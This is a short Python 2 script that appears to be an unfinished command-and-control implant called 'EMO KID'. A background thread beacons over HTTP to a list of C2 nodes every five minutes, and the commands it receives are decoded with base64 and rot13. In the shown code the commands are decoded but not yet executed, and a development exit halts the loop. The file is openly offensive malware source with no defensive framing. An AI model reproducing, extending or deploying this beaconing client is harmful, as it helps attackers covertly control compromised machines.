#!/usr/bin/env python

from optparse import OptionParser
import httplib
from threading import Thread
import time
import codecs
import base64
import json
import sys
from socket import error as socket_error

C2_NODES = ( '192.168.1.2'
			,'127.0.0.2'
			)
BEACON_INTERVAL = 5 * 60 # 5 minutes
CON_TIMEOUT = 5
COMMAND_FILE = '/'

class BeaconThread(Thread):

	def __init__(self):
		self.stopped = False
		Thread.__init__(self) 

	def decode_response(self, data):
		print '[*] Decoding response'
		json_data = base64.urlsafe_b64decode(data)
		decoded_json = json.loads(json_data)

		commands = dict()
		for key in decoded_json:
			d_key = codecs.decode(key, 'rot_13')
			d_val = codecs.decode(decoded_json[key], 'rot_13')
			commands[d_key] = d_val

		return commands

	def beacon(self, node):
		
		print "[*] Attempting connection to %s" % (node)
		conn = httplib.HTTPConnection(node, timeout=CON_TIMEOUT)
		conn.request("GET", COMMAND_FILE)
		response = conn.getresponse()

		print "[*]       %s : %s %s " % (node, response.status, response.reason)
		if response.status != httplib.OK:
			raise httplib.HTTPException

		data = response.read()
		conn.close()
		return data

	def run(self):
		while not self.stopped:
			for node in C2_NODES:
				try:
					response = self.beacon(node)
					commands = self.decode_response(response)
					break
				except socket_error:
					if node == C2_NODES[len(C2_NODES)-1]:
						print " BOOM "
						exit()
					continue
				except:
					print "[#] Unexpected error:", sys.exc_info()[0]
					raise

			print '[*] Sleeping...'
			exit() # remove this after development
			time.sleep(BEACON_INTERVAL)

def main():

	print "***********************"
	print "*                     *"
	print "*       EMO KID       *"
	print "*                     *"
	print "***********************"
	
	b_thread = BeaconThread()
	b_thread.start()


if __name__ == "__main__":
    main()